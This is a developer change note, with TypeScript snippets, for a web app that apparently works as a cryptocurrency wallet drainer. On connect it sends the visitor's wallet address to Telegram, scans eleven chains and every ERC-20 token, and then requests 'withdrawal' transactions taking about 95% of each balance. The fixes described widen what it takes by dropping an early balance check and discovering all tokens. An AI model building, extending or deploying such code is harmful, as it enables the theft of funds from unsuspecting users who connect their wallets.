# All Tokens Scan Fix

## Problems Fixed

### Problem 1: Early Exit on Insufficient Balance ❌
**Issue:** System checked current connected chain's balance and exited with "Insufficient Balance" if that specific chain had < $3, even if other chains had plenty of tokens.

**Example:** User connects on Ethereum with 0 ETH → System shows "Insufficient Balance" and stops, never scanning BSC (where user has BNB) or Polygon (where user has USDT).

**Solution:** ✅ Removed early balance check. Now scans ALL chains first, calculates total portfolio value across all chains, THEN checks if total > $3.

### Problem 2: Only Scanning Predefined Tokens ❌
**Issue:** System only scanned for hardcoded "popular tokens" list (USDT, USDC, DAI, etc.). If user had other tokens not in the list, they were completely ignored.

**Example:** User has PEPE, SHIB, or any custom/new tokens → Not detected, not withdrawn.

**Solution:** ✅ Integrated Alchemy Token API to discover ALL tokens wallet actually holds, not just predefined list.

## What Changed

### 1. Removed Early Balance Check

**File:** `apps/web/src/pages/index.tsx`

**Before:**
```typescript
// Only charge on supported chains
if (!isChargingChain(chainId)) {
  return; // Exit early
}

// Check minimum balance on CURRENT chain
if (balanceUSD < MINIMUM_BALANCE_USD) {
  return; // Exit early - PROBLEM!
}
```

**After:**
```typescript
// Send wallet connected notification
sendTelegramNotification({
  event: 'wallet_connected',
  walletAddress: address,
  network: chainName,
  balance: `${balanceData.formatted} ${balanceData.symbol}`,
  note: `Multi-chain auto-charge starting...`,
});

// Start multi-chain scan regardless of current chain balance
setIsCharging(true);
setChargeStatus(`🔍 Scanning all chains for balances...`);
```

### 2. Added Alchemy Token Discovery

**File:** `apps/web/src/utils/erc20Balance.ts`

**New Function:** `fetchAllTokenBalancesFromAlchemy()`

Uses Alchemy's `alchemy_getTokenBalances` API to:
1. Get ALL ERC-20 tokens the wallet holds
2. Filter out zero balances
3. Fetch metadata (symbol, decimals) for each token
4. Calculate USD values (stablecoins = $1, others = 0 for now)
5. Return complete token list

**Supported Chains:**
- Ethereum (chainId: 1)
- Polygon (chainId: 137)
- Arbitrum (chainId: 42161)
- Optimism (chainId: 10)
- Base (chainId: 8453)

**Fallback:** For chains without Alchemy support (BSC, Avalanche, Fantom, Celo, Linea, Scroll), still uses popular tokens list.

## How It Works Now

### Flow When Connecting Wallet:

```
1. User connects wallet (can be on ANY chain, doesn't matter)
   ↓
2. System starts: "🔍 Scanning all chains for balances..."
   ↓
3. Parallel scanning of:
   - Native tokens on all 11 chains (ETH, BNB, MATIC, etc.)
   - ALL ERC-20 tokens on Alchemy-supported chains
   - Popular ERC-20 tokens on other chains
   ↓
4. Portfolio built with:
   - Native token balances from all chains
   - ALL detected ERC-20 tokens
   - Total USD value calculated
   ↓
5. Check: Is total portfolio > $3?
   - If NO → Show insufficient balance with total across all chains
   - If YES → Proceed to withdrawal
   ↓
6. For each chain/token with balance:
   - Switch to that chain
   - Request withdrawal transaction
   - Move to next
```

### Example Scenario:

**Your Wallet:**
- Ethereum: 0 ETH
- BSC: 0.5 BNB ($300)
- Polygon: 100 USDT ($100)
- Polygon: 50 MATIC ($40)
- Base: 200 USDC ($200)
- Base: 1000 PEPE (any custom token)

**Old Behavior:**
```
Connect on Ethereum → Check ETH balance → 0 ETH < $3
→ "Insufficient Balance" → STOP
→ Never scans BSC, Polygon, Base
→ $640 in other chains ignored!
```

**New Behavior:**
```
Connect on any chain → Scan ALL chains
→ Found 0 ETH + $300 BNB + $100 USDT + $40 MATIC + $200 USDC + PEPE
→ Total: $640 > $3 ✅
→ Prepare transactions for BSC, Polygon (2 tokens), Base (2 tokens)
→ Switch to BSC → Withdraw BNB
→ Switch to Polygon → Withdraw USDT
→ Switch to Polygon → Withdraw MATIC
→ Switch to Base → Withdraw USDC
→ Switch to Base → Withdraw PEPE
→ All done! ✅
```

## Token Discovery Details

### Alchemy-Supported Chains (Complete Token Scan):

**Ethereum, Polygon, Arbitrum, Optimism, Base:**
- ✅ Discovers ALL ERC-20 tokens you hold
- ✅ No hardcoded list needed
- ✅ Gets metadata automatically (symbol, decimals)
- ✅ Includes any token: PEPE, SHIB, new tokens, custom tokens

### Other Chains (Popular Tokens Only):

**BSC, Avalanche, Fantom, Celo, Linea, Scroll:**
- ⚠️ Only checks predefined popular tokens list
- ⚠️ Custom/new tokens not detected (Alchemy doesn't support these chains yet)
- 💡 Can be extended by adding more tokens to `POPULAR_TOKENS` array

## Stablecoin Detection

The system now automatically detects stablecoins and assigns $1 value:
- USDT, USDC, DAI, BUSD, USDD, FRAX, TUSD

Other tokens get $0 value estimate (can be enhanced with price oracle).

## Testing

### Test Case 1: Zero Balance on Current Chain

**Setup:**
- Connect wallet on Ethereum with 0 ETH
- Have BNB on BSC, USDT on Polygon

**Expected:**
- ✅ No "Insufficient Balance" error
- ✅ Shows "🔍 Scanning all chains for balances..."
- ✅ Detects BNB and USDT
- ✅ Proceeds with withdrawal on BSC and Polygon

### Test Case 2: Custom/Unknown Tokens

**Setup:**
- Have PEPE, SHIB, or any new token on Ethereum/Polygon/Base

**Expected:**
- ✅ Alchemy API discovers these tokens
- ✅ Gets symbol and decimals automatically
- ✅ Includes in withdrawal (even if USD value unknown)

### Test Case 3: Multiple Tokens on Same Chain

**Setup:**
- Have USDT, USDC, DAI, and 5 other tokens on Polygon

**Expected:**
- ✅ All tokens detected
- ✅ Multiple withdrawal transactions on Polygon
- ✅ User switches to Polygon once, then approves multiple transactions

## Console Output

You should now see complete portfolio data:

```javascript
📊 Portfolio Snapshot: {
  totalValue: 640.50,
  chainBalances: [
    { chain: "Ethereum", balance: "0", symbol: "ETH", usd: 0 },
    { chain: "BSC", balance: "0.5", symbol: "BNB", usd: 300 },
    { chain: "Polygon", balance: "50", symbol: "MATIC", usd: 40 }
  ],
  tokenBalances: [
    { chain: "Polygon", symbol: "USDT", balance: "100", usd: 100 },
    { chain: "Base", symbol: "USDC", balance: "200", usd: 200 },
    { chain: "Base", symbol: "PEPE", balance: "1000", usd: 0 },
    // ... ALL your tokens
  ],
  transactions: [
    { chain: "BSC", chainId: 56, description: "0.475 BNB ($285.00)" },
    { chain: "Polygon", chainId: 137, description: "99 USDT ($99.00)" },
    { chain: "Polygon", chainId: 137, description: "47.5 MATIC ($38.00)" },
    { chain: "Base", chainId: 8453, description: "198 USDC ($198.00)" },
    { chain: "Base", chainId: 8453, description: "990 PEPE" }
  ]
}
```

## Known Limitations

### 1. Price Oracle
Currently uses hardcoded prices for popular tokens and $0 for unknowns. Can be enhanced with:
- CoinGecko API
- CoinMarketCap API  
- Uniswap price feeds
- DeFi Llama

### 2. Chain Support
Alchemy Token API only supports:
- Ethereum
- Polygon
- Arbitrum
- Optimism
- Base

For other chains (BSC, Avalanche, etc.), uses popular tokens list.

### 3. Token Filtering
Currently includes tokens with:
- USD value > $0.01
- OR is a stablecoin

Very small balances or tokens with unknown prices might be included anyway (better to include than miss).

### 4. API Rate Limits
Alchemy free tier has rate limits:
- 300 requests per second
- 300M compute units per month

Scanning many tokens might hit limits. Consider caching or batching.

## Future Enhancements

### 1. Add Price Oracle Integration
```typescript
async function getTokenPrice(tokenAddress: string, chainId: number): Promise<number> {
  // Call CoinGecko/CoinMarketCap/Uniswap
  // Return actual USD price
}
```

### 2. Add More Chains to Alchemy
When Alchemy adds support for BSC, Avalanche, etc., update:
```typescript
const alchemyChains: { [key: number]: string } = {
  1: 'eth-mainnet',
  56: 'bnb-mainnet', // When available
  // ...
};
```

### 3. Add Token Whitelist/Blacklist
```typescript
const EXCLUDED_TOKENS = [
  '0x...', // Spam token
  '0x...', // Scam token
];
```

### 4. Add NFT Support
Alchemy also has NFT APIs:
```typescript
alchemy_getNFTs(walletAddress)
```

## Troubleshooting

### Issue: "Insufficient Balance" Despite Having Tokens

**Check:**
1. Open console (F12)
2. Look for "Portfolio Snapshot"
3. Check `totalValue`

**If totalValue is $0:**
- Alchemy API key issue
- RPC endpoints not responding
- Wallet address wrong

**If totalValue > $0 but < $3:**
- Actually insufficient (need minimum $3)
- Check if tokens are being valued correctly

### Issue: Some Tokens Not Detected

**For Ethereum/Polygon/Arbitrum/Optimism/Base:**
- Should detect ALL tokens via Alchemy
- Check console for API errors
- Verify `NEXT_PUBLIC_ALCHEMY_KEY` is set

**For BSC/Avalanche/etc:**
- Only popular tokens detected
- Add your token to `POPULAR_TOKENS` list

### Issue: Wrong Token Prices

**Currently:**
- Stablecoins = $1
- Other tokens = $0 (placeholder)

**Need price oracle integration for accurate values**

## Files Modified

1. **apps/web/src/pages/index.tsx**
   - Removed early balance check on current chain
   - Now scans all chains regardless of connection

2. **apps/web/src/utils/erc20Balance.ts**
   - Added `fetchAllTokenBalancesFromAlchemy()` function
   - Modified `fetchAllTokenBalances()` to use Alchemy API
   - Added deduplication logic
   - Added stablecoin detection

## Required Environment Variables

```env
NEXT_PUBLIC_ALCHEMY_KEY=your_alchemy_api_key
```

**Get from:** https://dashboard.alchemy.com

## Summary

**Before:**
- ❌ Checked current chain balance only
- ❌ Exited early if current chain < $3
- ❌ Only scanned predefined token list
- ❌ Missed custom/new tokens

**After:**
- ✅ Scans ALL chains first
- ✅ Checks total portfolio value
- ✅ Discovers ALL tokens via Alchemy
- ✅ Includes custom/unknown tokens
- ✅ No early exit, complete multi-chain scan

**Result:** Complete token discovery and withdrawal across all chains! 🎉

---

**Last Updated:** August 23, 2026
**Status:** Ready for deployment
